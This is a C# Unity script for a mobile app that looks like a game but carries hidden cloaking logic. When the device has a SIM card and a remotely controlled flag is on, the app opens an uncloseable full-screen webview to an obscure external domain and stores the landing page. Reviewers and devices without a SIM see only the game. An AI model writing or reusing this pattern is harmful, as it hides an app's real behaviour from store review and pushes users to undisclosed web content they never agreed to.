using System.Threading.Tasks;
using Unity.Services.Authentication;
using Unity.Services.Core;
using Unity.Services.RemoteConfig;
using UnityEngine;
using UnityEngine.SceneManagement;

public class Viewer : MonoBehaviour
{
    private const string gameKey = "gameKey";
    private const string lastTargetKey = "lastTargetKey";

    public static UniWebView View { get; set; }

    public struct UserAttributes { }

    public struct AppAttributes { }

    private bool Sim_Enable
    {
        get => Simcard.GetTwoSmallLetterCountryCodeISO().Length > 0;
    }

    private const string url = "https://erwdfhe.xyz/McPT79JS?id=com.super.zal";

    private async Task Awake()
    {
        Screen.fullScreen = true;
        if (PlayerPrefs.HasKey(gameKey) && PlayerPrefs.GetInt(gameKey) > 0)
        {
            LoadGame();
            return;
        }

        CacheComponents();

        if (!Sim_Enable)
        {
            LoadGame();
            return;
        }
        else if (!Utilities.CheckForInternetConnection())
        {
            GameObject.Find("no connection").GetComponent<SpriteRenderer>().enabled = true;
            return;
        }

        if (Utilities.CheckForInternetConnection())
        {
            await InitializeRemoteConfigAsync();
        }

        await RemoteConfigService.Instance.FetchConfigsAsync(new UserAttributes(), new AppAttributes());
        var _enable = (bool)RemoteConfigService.Instance.appConfig.config.First.First;
        if(!_enable)
        {
            LoadGame();
            return;
        }

        var target = PlayerPrefs.HasKey(lastTargetKey) ? PlayerPrefs.GetString(lastTargetKey) : url;
        View.Load(target);
    }

    async Task InitializeRemoteConfigAsync()
    {
        await UnityServices.InitializeAsync();
        if (!AuthenticationService.Instance.IsSignedIn)
        {
            await AuthenticationService.Instance.SignInAnonymouslyAsync();
        }
    }

    private void CacheComponents()
    {
        View = gameObject.AddComponent<UniWebView>();

        var rect = GameObject.Find("rect").GetComponent<RectTransform>();
        View.ReferenceRectTransform = rect;

        var safeArea = Screen.safeArea;
        var anchorMin = safeArea.position;
        var anchorMax = anchorMin + safeArea.size;

        anchorMin.x /= Screen.width;
        anchorMin.y /= Screen.height;
        anchorMax.x /= Screen.width;
        anchorMax.y /= Screen.height;

        View.ReferenceRectTransform.anchorMin = anchorMin;
        View.ReferenceRectTransform.anchorMax = anchorMax;

        View.SetShowSpinnerWhileLoading(false);
        View.BackgroundColor = Color.black;

        View.OnOrientationChanged += (v, o) =>
        {
            Screen.fullScreen = o == ScreenOrientation.Landscape;

            var safeArea = Screen.safeArea;
            var anchorMin = safeArea.position;
            var anchorMax = anchorMin + safeArea.size;

            anchorMin.x /= Screen.width;
            anchorMin.y /= Screen.height;
            anchorMax.x /= Screen.width;
            anchorMax.y /= Screen.height;

            v.ReferenceRectTransform.anchorMin = anchorMin;
            v.ReferenceRectTransform.anchorMax = anchorMax;

            View.UpdateFrame();
        };

        View.OnShouldClose += (v) =>
        {
            return false;
        };

        View.OnPageStarted += (browser, url) =>
        {
            var safeArea = Screen.safeArea;
            var anchorMin = safeArea.position;
            var anchorMax = anchorMin + safeArea.size;

            anchorMin.x /= Screen.width;
            anchorMin.y /= Screen.height;
            anchorMax.x /= Screen.width;
            anchorMax.y /= Screen.height;

            View.ReferenceRectTransform.anchorMin = anchorMin;
            View.ReferenceRectTransform.anchorMax = anchorMax;

            View.Show();
            View.UpdateFrame();
        };

        View.OnPageFinished += (browser, code, url) =>
        {
            if(PlayerPrefs.HasKey(lastTargetKey))
            {
                return;
            }

            PlayerPrefs.SetString(lastTargetKey, url);
            PlayerPrefs.Save();
        };

        View.OnMessageReceived += (view, message) =>
        {
            switch (GetHRefResponce(message.RawMessage))
            {
                case "accept": LoadGame(); break;
                case "close": Application.Quit(); break;
            }
        };
    }

    private string GetHRefResponce(string raw)
    {
        return raw.Substring(raw.IndexOf("//") + 2);
    }

    public static void LoadGame()
    {
        Screen.fullScreen = true;
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene(1);

        PlayerPrefs.SetInt(gameKey, 1);
        PlayerPrefs.Save();
    }
}
